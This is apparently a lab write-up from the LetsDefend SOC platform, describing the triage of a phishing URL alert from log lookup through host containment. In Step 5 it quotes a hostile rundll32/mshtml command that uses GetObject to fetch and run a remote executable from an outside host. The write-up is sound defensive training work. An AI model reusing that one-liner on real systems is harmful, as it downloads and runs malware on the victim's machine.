# LetsDefend Write-Up: SOC141 – Phishing URL Detected

| | |
|---|---|
| **Platform** | LetsDefend |
| **Event ID** | 86 |
| **Rule** | SOC141 - Phishing URL Detected |
| **Level** | Security Analyst |

## 1. Alert Details

| Field | Value |
|---|---|
| Event time | March 22 2021 21:23 PM |
| Username | ellie |
| Source Hostname | EmilyComp |
| Source Address | 172.16.17.49 |
| Destination Address | 91.189.114.8 |
| Destination Hostname | mogagrocol.ru |


## Step 1 - Read the alert details
I read the alert SOC141 (Event ID 86) and recorded the time, Username, Source address, Source Host name, Destination Address, Destination Host name and device action


## Step 2 - Check the log management
I used the Source IP in log management and saw there are connection with the Source Address to URL

![Photo](Image/2/log_management.png)

## Step 3 - Analyze the URL
In virustotal I search for URL it's return it as a malicious URL
![threat_intel](Image/2/virustotal.png)

## Step 4 - Check if the URL Delivered or anyone connected to it
I used the Destination IP of the URL and search with it in log management to saw if anyone connected to this URL and it's return one Device and it's the same device that alert come from it

## Step 5 - Review the username history
Searching the username `EmilyComp` in the Endpoint Security and saw the history of terminal, process, Browser:
![Photo](Image/2/endpoint.png)
![Photo](Image/2/endpoint2.png)

In terminal history:
```
rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')'
```
This command is highly suspicious because it abuses the legitimate Windows executable rundll32.exe to invoke JavaScript through the mshtml component. It then uses GetObject() with a remote URL, indicating an attempt to retrieve or process content from an external host.

The URL references a file named KBDYAK.exe, which may be a malicious payload. The command's structure is consistent with a technique used by attackers to leverage legitimate Windows components to initiate suspicious script activity and retrieve external content.

The file `KBDYAK.exe` it run on the Device I know that from the process history so the file was executed in the device so I must isolate the device

## Step 6 - Contain The Device
I Containment the device from the network isolated it to more investigation on the device 

![Photo](Image/2/contain.png)

Closed the alert as a True Positive.

